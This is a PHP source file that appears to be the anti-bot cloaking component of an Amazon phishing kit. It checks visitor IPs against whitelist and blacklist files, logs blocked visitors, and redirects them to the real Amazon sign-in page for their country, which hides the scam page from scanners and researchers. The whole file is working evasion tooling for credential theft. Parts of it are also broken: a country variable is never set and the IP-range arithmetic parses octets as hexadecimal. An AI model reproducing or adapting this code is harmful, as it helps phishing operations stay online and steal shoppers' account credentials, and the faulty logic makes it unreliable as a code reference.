<?php
date_default_timezone_set("Asia/Jakarta");
$ips = array($_SERVER['REMOTE_ADDR'],);
$checklistss = new IpBlockListss( );

$random_id = sha1(rand(0,100000000));

foreach ($ips as $ip) {
	$result = $checklistss->ipPass( $ip );
	if (!$result) {
		$msg = "FAILED : ".$checklistss->ipPass( $ip );
		$ip = getUserIp();
		tulis_file("result/block_bot.tx","BLOCKED ONETIME || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
		tulis_file("log/total_bot.txt","$ip (ONETIME)");
		if($countryname == "Germany"){
              header("location: https://www.amazon.de/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=deflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.de%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_signin&switch_account= ");
            }
        	else if($countryname == "Japan"){
              header("location: https://www.amazon.co.jp/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=jpflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_signin&switch_account=");
            }
        	else if($countryname == "France"){
              header("location: https://www.amazon.fr/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=frflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_custrec_signin&switch_account=");
            }else{
              header("location: https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
            }
            exit();
	}
}

class IpListss {

	private $iplist = array();
  	private $ipfile = "";

  	public function __construct( $list ) {
  		$contents = array();
  		$this->ipfile = $list;
  		$lines = $this->read( $list );
  	foreach( $lines as $line ) {
      $line = trim( $line );
      # remove comment and blank lines
      if ( empty($line ) ) {
        continue;
      }
      if ( $line[0] == '#' ) {
        continue;
      }
      # remove on line comments
      $temp = explode( "#", $line );
      $line = trim( $temp[0] );
      # create content array
      $contents[] = $this->normal($line);
    }   
    $this->iplist = $contents;
  }

  public function __destruct() {
  }

  public function __toString() {
    return implode(' ',$this->iplist);
  }
  public function is_inlist( $ip ) {
    $retval = false;    
    foreach( $this->iplist as $ipf ) {
      $retval = $this->ip_in_range( $ip, $ipf );
      if ($retval === true ) {
        $this->range = $ipf;
        break;
      }
    }
    return $retval;
  }
  /*
  ** public function that returns the ip list array
  */
  public function iplist() {
    return $this->iplist; 
  }
  
  /*
  */
  public function message() {
    return $this->range;
  }
  
  public function append( $ip, $comment ) {
        return file_put_contents( $this->ipfile, $ip, $comment ); 
  }
  
  public function listname() {
        return $this->ipfile;
  }
  
  /*
  ** private function that reads the file into array
  */
  private function read( $fname ) {
    try {
      $file = file( $fname, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES  );
    }
    catch( Exception $e ) {
      throw new Exception( $fname.': '.$e->getmessage() . '\n');
    }
    return $file;
  }
  
  private function ip_in_range( $ip, $range ) {
  
    // return ip_in_range( $ip, $range );
    
        if ( strpos($range, '/') !== false ) {
            // IP/NETMASK format
            list( $range, $netmask ) = explode( '/', $range, 2 );
            if ( strpos( $netmask, '.' ) !== false ) {
                // 255.255.255.0 format w/ wildcards
                $netmask = str_replace('*', '0', $netmask );
                $dnetmask = ip2long( $netmask );
                return ((ip2long( $ip ) & $dnetmask) == (ip2long($range) & $dnetmask ));
            }
            else {
                // IP/CIDR format
                // insure $range format 0.0.0.0
                $r = explode( '.', $range );
                while( count( $r ) < 4 ) {
                    $r[] = '0';
                }
                for($i = 0; $i < 4; $i++) {
                    $r[$i] = empty($r[$i]) ? '0': $r[$i];
                }
                $range = implode( '.', $r );
                // build netmask
                $dnetmask = ~(pow( 2, ( 32 - $netmask)) - 1);
                return ((ip2long($ip) & $dnetmask)==(ip2long($range) & $dnetmask));
            }
        }
        else {
            if ( strpos( $range, '*' ) !== false ) {
                // 255.255.*.* format
                $low = str_replace( '*', '0', $range );
                $high = str_replace( '*', '255', $range );
                $range = $low.'-'.$high;
            }
            if ( strpos( $range, '-') !== false ) {
                // 128.255.255.0-128.255.255.255 format
                list( $low, $high ) = explode( '-', $range, 2 );
                
                $dlow  = $this->toLongs( $low );
                $dhigh = $this->toLongs( $high );
                $dip   = $this->toLongs( $ip );
                return (($this->compare($dip,$dlow) != -1) && ($this->compare($dip,$dhigh) != 1)); 
            }
        }
        return ( $ip == $range );
  }

  private function normal( $range ) {
    if ( strpbrk( "*-/", $range ) === False ) {
      $range .= "/32";
    }
    return str_replace( ' ', '', $range );
  }
  
  private function toLongs( $ip ) {
    # $Ip = $this->expand();
    # $Parts = explode(':', $Ip);
    $Parts = explode('.', $ip );
    $Ip = array('', '');
    # for ($i = 0; $i < 4; $i++) {
    for ($i = 0; $i < 2; $i++){
      $Ip[0] .= str_pad(base_convert($Parts[$i], 16, 2), 16, 0, STR_PAD_LEFT);
    }
    # for ($i = 4; $i < 8; $i++) { 
    for ($i = 2; $i < 4; $i++) { 
      $Ip[1] .= str_pad(base_convert($Parts[$i], 16, 2), 16, 0, STR_PAD_LEFT);
    }
        return array(base_convert($Ip[0], 2, 10), base_convert($Ip[1], 2, 10));
  }
  
  private function compare( $ipdec1, $ipdec2 ) {
        if( $ipdec1[0] < $ipdec2[0] ) {
            return -1;
        }
        elseif ( $ipdec1[0] > $ipdec2[0] ) {
            return 1;
        }
        elseif ( $ipdec1[1] < $ipdec2[1] ) {
            return -1;
        }
        elseif ( $ipdec1[1] > $ipdec2[1] ) {
            return 1;
        }
        return 0;
  }
}

class IpBlockListss {

    private $statusid = array( 'negative' => -1, 'neutral' => 0, 'positive' => 1 );

  private $whitelist = array();
  private $blacklist = array();
  private $message   = NULL;
  private $status    = NULL;

  public function __construct( $whitelistfile = './security/whitelist.dat', 
                  $blacklistfile = './security/onetime.dat' ) {
    $this->whitelistfile = $whitelistfile;
    $this->blacklistfile = $blacklistfile;
    
    $this->whitelist = new IpListss( $whitelistfile );
    $this->blacklist = new IpListss( $blacklistfile );
  }
  
  public  function    __destruct() { 
  }
  
  public function ipPass( $ip ) {
    $retval = False;
    
    if ( !filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 ) ) {
            throw new Exception( 'Requires valid IPv4 address' );
    }
    
    if ( $this->whitelist->is_inlist( $ip ) ) {
      // Ip is white listed, so it passes
      $retval = True;
      $this->message = $ip . " is whitelisted by ".$this->whitelist->message().".";
      $this->status = $this->statusid['positive'];
    }
    else if ( $this->blacklist->is_inlist( $ip ) ) {
      $retval = False;
      $this->message = $ip . " is blacklisted by ".$this->blacklist->message().".";
      $this->status = $this->statusid['negative'];
    }
    else {
      $retval = True;
      $this->message = $ip . " is unlisted.";
      $this->status = $this->statusid['neutral'];
    }
    return $retval;
  }
  
  public function message() {
    return $this->message;
  }

         public function status() {
             return $this->status;
         }

  public function append( $type, $ip, $comment = "" ) {
        if ($type == 'WHITELIST' ) {
            $retval = $this->whitelistfile->append( $ip, $comment );
        }
        elseif( $type == 'BLACKLIST' ) {
            $retval = $this->blacklistfile->append( $ip, $comment );
        }
        else {
            $retval = false;
        }
  }

  public function filename( $type, $ip, $comment = "" ) {
        if ($type == 'WHITELIST' ) {
            $retval = $this->whitelistfile->filename( $ip, $comment );
        }
        elseif( $type == 'BLACKLIST' ) {
            $retval = $this->blacklistfile->filename( $ip, $comment );
        }
        else {
            $retval = false;
        }
  }
}
?>